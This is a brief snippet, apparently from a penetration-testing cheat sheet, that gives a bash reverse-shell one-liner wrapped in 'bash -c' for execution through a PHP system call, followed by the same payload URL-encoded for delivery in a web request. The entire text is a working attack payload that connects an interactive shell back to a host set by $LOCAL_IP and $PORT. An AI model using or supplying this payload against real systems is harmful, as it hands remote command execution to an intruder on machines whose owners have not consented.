
In case of php system call or other context (executing in non-bash shell):
```bash
bash -c "bash -i >& /dev/tcp/$LOCAL_IP/$PORT 0>&1"
```

URL encoded payload:
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$LOCAL_IP%2F$PORT%200%3E%261%22
```